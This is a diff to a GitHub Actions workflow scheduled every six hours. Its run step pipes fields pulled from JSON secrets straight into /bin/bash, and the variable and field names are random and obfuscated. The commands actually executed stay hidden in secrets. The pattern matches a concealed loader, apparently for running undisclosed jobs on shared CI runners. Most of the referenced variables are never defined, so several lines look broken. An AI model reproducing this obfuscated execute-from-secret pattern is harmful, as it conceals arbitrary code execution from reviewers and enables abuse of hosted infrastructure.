@@ -2,7 +2,8 @@ name: dengfei19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '12 1/6 * * *'
+    - cron: '28 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,20 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: dengfei19871010
         env:
-          p56: ${{ secrets.p56 }}
+          chl09900: ${{ secrets.chl09900 }}
         run: |
-          echo $p56 | jq -r .ql41855 | /bin/bash
-          echo $fozpi7380 | jq -r .ho88485 | /bin/bash
-          echo $j925 | jq -r .hscx6 | /bin/bash
-          echo $ygxns0976 | jq -r .roill8097 | /bin/bash
-          echo $qw1 | jq -r .ijar7920 | /bin/bash
-          echo $tak0884 | jq -r .g844 | /bin/bash
-          echo $f4534 | jq -r .yu63667 | /bin/bash
-          echo $sttra48 | jq -r .zf7 | /bin/bash
-          echo $vinf6918 | jq -r .vgky8093 | /bin/bash
-          echo $b881 | jq -r .zxnb1 | /bin/bash
-          echo $iqkq28 | jq -r .k20 | /bin/bash
-          echo $v9518 | jq -r .xwhqj81 | /bin/bash
-          echo $tadfq5918 | jq -r .p331 | /bin/bash
-          echo $tl7 | jq -r .pm29 | /bin/bash
+          echo $chl09900 | jq -r .iryv45 | /bin/bash
+          echo $po02 | jq -r .xat13647 | /bin/bash
+          echo $bmfqy425 | jq -r .xy2825 | /bin/bash
+          echo $oezaf002 | jq -r .rwewt8805 | /bin/bash
+          echo $n32 | jq -r .efj982 | /bin/bash
+          echo $uav33164 | jq -r .gfsw39561 | /bin/bash
+          echo $hdqgu06017 | jq -r .kik7053 | /bin/bash
 
